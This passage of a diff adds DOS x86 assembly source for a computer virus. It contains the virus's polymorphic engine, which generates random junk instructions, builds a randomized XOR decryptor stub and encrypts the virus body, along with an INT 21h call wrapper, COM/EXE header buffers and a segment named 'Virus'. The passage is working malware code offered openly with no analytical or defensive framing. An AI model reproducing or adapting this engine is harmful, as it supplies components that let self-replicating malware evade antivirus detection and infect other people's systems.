+        or      al,byte ptr virusr
+        stosb
+
+        mov     al,75h
+        stosb
+
+        mov     ax,di
+        inc     ax
+        sub     ax,bp
+        neg     ax
+        stosb
+
+        mov     word ptr encstart,di
+
+        mov     ax,di
+        neg     ax
+        add     ax,word ptr virusput
+        add     ax,85
+        mov     si,word ptr ppos
+        sub     word ptr [si],ax
+        mov     si,word ptr vpos
+        add     word ptr [si],ax
+        add     word ptr cvirus,ax
+        
+        mov     cx,ax
+        mov     al,90h                  ;pad with nops
+        rep     stosb
+
+        mov     si,word ptr virusget
+        mov     cx,word ptr virusval
+        rep     movsb
+
+        mov     ax,word ptr ccipher
+        mov     si,word ptr encstart
+        mov     cx,word ptr cvirus
+encirus:
+        xor     word ptr [si],ax
+        add     ax,word ptr addval
+        inc     si
+        loop    encirus
+        
+        sub     di,word ptr virusput
+        mov     cx,di
+
+        ret
+
+sip     db      4,6     ;r/m,reg
+dip     db      5,7
+bip     db      7,3
+
+makegarbage     proc    near
+        mov     ax,4
+        call    genrand
+        shl     ax,1
+        add     ax,offset gcalls
+        mov     si,ax
+        mov     ax,word ptr [si]
+        jmp     ax
+makegarbage     endp
+
+gcalls  dw      offset g1
+        dw      offset g2
+        dw      offset g3
+        dw      offset g4
+
+garbage4:
+        mov     ah,1
+        int     16h
+        mov     ah,2
+        int     16h
+        mov     ah,0dh
+        int     21h
+        mov     ah,19h
+        int     21h
+        mov     ah,54h
+        int     21h
+        mov     ah,0bh
+        int     21h
+        mov     ah,3bh
+        int     21h
+        mov     ah,0
+        int     13h
+
+g4      proc    near
+;Wacks an interrupt vector into the buffer
+        cmp     byte ptr inloop,1
+        je      g2st
+        mov     ax,8
+        call    genrand
+        shl     ax,1
+        shl     ax,1
+        add     ax,offset garbage4
+        mov     si,ax
+        movsw
+        movsw
+        ret
+g4      endp
+
+g3      proc    near
+;creates a mov
+        call    genreg
+        or      al,0b8h
+        stosb
+        call    randval
+        stosw
+        ret
+g3      endp
+
+g2      proc    near
+;creates op reg,reg instructions
+g2st:
+        mov     ax,8
+        call    genrand
+        mov     cl,3
+        shl     al,cl
+        or      al,3
+        stosb
+        call    genreg
+        shl     al,cl
+        or      al,0c0h
+        mov     cl,al
+        mov     ax,8
+        call    genrand
+        or      al,cl
+        stosb
+        ret
+g2      endp
+
+g1      proc    near
+        mov     ax,2
+        call    genrand
+        mov     cl,3
+        shl     al,cl
+        mov     cl,al
+        call    genreg
+        or      al,cl
+        or      al,40h
+        stosb
+        ret
+g1      endp
+
+genreg  proc    near
+;returns al=reg
+nextgr:
+        mov     ax,8
+        call    genrand
+        mov     si,ax
+        add     si,offset regtable
+        cmp     byte ptr [si],1
+        je      nextgr
+        ret
+genreg  endp
+        
+
+make_stub       proc    near
+stubloop:
+        mov     ax,6
+        call    genrand
+        shl     ax,1
+        add     ax,offset stubtab
+        mov     si,ax
+        mov     ax,word ptr [si]
+        call    ax
+        cmp     byte ptr setupbyte,0eeh
+        jne     stubloop
+        ret
+make_stub       endp
+
+stubtab dw      offset addsub_pointer
+        dw      offset addsub_cipher
+        dw      offset addsub_virus
+        dw      offset setup_pointer
+        dw      offset setup_cipher
+        dw      offset setup_virus
+
+addsub_pointer  proc    near
+        test    byte ptr setupbyte,80h
+        jz      noap
+        test    byte ptr setupbyte,8
+        jnz     noap
+        call    makegarbage
+        mov     al,81h
+        stosb
+        mov     al,byte ptr pointr
+        or      al,0c0h
+        stosb
+
+        mov     word ptr ppos,di
+        mov     ax,85
+        add     ax,word ptr deltaval
+        sub     ax,word ptr cpoint
+        stosw
+        add     word ptr cpoint,ax
+        or      byte ptr setupbyte,8
+noap:
+        ret
+addsub_pointer  endp
+
+addsub_cipher   proc    near
+        test    byte ptr setupbyte,40h
+        jz      nocp
+        test    byte ptr setupbyte,4
+        jnz     nocp
+        call    makegarbage
+        mov     al,81h
+        stosb
+        mov     al,byte ptr cipherr
+        or      al,0c0h
+        stosb
+        call    randval
+        stosw
+        add     word ptr ccipher,ax
+        or      byte ptr setupbyte,4
+nocp:
+        ret
+addsub_cipher   endp
+
+addsub_virus    proc    near
+        test    byte ptr setupbyte,20h
+        jz      noav
+        test    byte ptr setupbyte,2
+        jnz     noav
+        call    makegarbage
+        mov     al,81h
+        stosb
+        mov     al,byte ptr virusr
+        or      al,0c0h
+        stosb
+        mov     word ptr vpos,di
+        mov     ax,word ptr virusval
+        sub     ax,word ptr cvirus
+        dec     ax                      ;coz we are xoring by words
+        stosw
+        add     word ptr cvirus,ax
+        or      byte ptr setupbyte,2
+noav:
+        ret
+addsub_virus    endp
+
+
+setup_pointer   proc    near
+;80h
+        test    byte ptr setupbyte,80h
+        jnz     nomp
+        call    makegarbage
+        mov     al,byte ptr pointr
+        or      al,0b8h
+        stosb
+        call    randval
+        stosw
+        mov     word ptr cpoint,ax
+        or      byte ptr setupbyte,80h
+nomp:
+        ret
+setup_pointer   endp
+
+setup_cipher    proc    near
+;40h
+        test    byte ptr setupbyte,40h
+        jnz     nomc
+        call    makegarbage
+        mov     al,byte ptr cipherr
+        or      al,0b8h
+        stosb
+        call    randval
+        stosw
+        mov     word ptr ccipher,ax
+        or      byte ptr setupbyte,40h
+nomc:
+        ret
+setup_cipher    endp
+
+setup_virus     proc    near
+;20h
+        test    byte ptr setupbyte,20h
+        jnz     nomv
+        call    makegarbage
+        mov     al,byte ptr virusr
+        or      al,0b8h
+        stosb
+        call    randval
+        stosw
+        mov     word ptr cvirus,ax
+        or      byte ptr setupbyte,20h
+nomv:
+        ret
+setup_virus     endp
+
+genrand proc    near
+;ax=number of possibilities
+;return ax = 0 to origax - 1
+        push    cx
+        push    dx
+        sub     dx,dx
+        mov     cx,ax
+        call    randval
+        div     cx
+        mov     ax,dx
+        pop     dx
+        pop     cx
+        ret
+
+genrand endp
+
+randval proc    near
+;returns ax=random number, not 0/ffff
+randstart:
+        in      al,40h
+        mov     ah,al
+        in      al,40h
+        or      ax,ax
+        jz      randstart
+        cmp     ax,-1
+        je      randstart
+        ret
+randval endp
+spoly   endp
+
+
+simint21        proc    near
+        pushf
+        call    dword ptr cs:o21
+        ret
+simint21        endp
+
+comstart        db      0e9h,0,0
+
+header  db      1ch dup (0)
+
+vsizer:
+        db      200 dup (0)
+;-- for the poly engine --
+inloop  db      0               ;whether or not to use ints (slow in the loop)
+
+encstart        dw      0       ;where to start encrypting from
+
+pointr  db      0               ;the register used
+pointrm db      0               ;the r/m for the pointer
+cpoint  dw      0               ;the current value of the pointer
+
+addval  dw      0               ;the value added between each iteration
+
+ppos    dw      0               ;where the pointer update is
+vpos    dw      0               ;where the size update is
+
+cipherr db      0               ;the register used
+ccipher dw      0               ;the current value of the cipher
+
+virusr  db      0               ;the register used
+cvirus  dw      0               ;the current value of the virus-size
+
+deltaval        dw      0       ;the delta offset for it
+virusval        dw      0       ;the size of the virus
+
+virusput        dw      0       ;initial di
+virusget        dw      0       ;initial si
+
+;                      AXCXDXBXSPBPSIDI
+regtable        db      1,0,0,0,1,0,0,0
+
+;80h = mp  40h = mc  20h = mv  8 = ap  4 = ac  2 = av
+setupbyte       db      0
+;-- for the poly engine --        
+encplace:
+        dupsize equ     offset vsizer +90 - offset code
+        db      dupsize dup (0)
+msizer:
+
+Virus   ends
+end     code
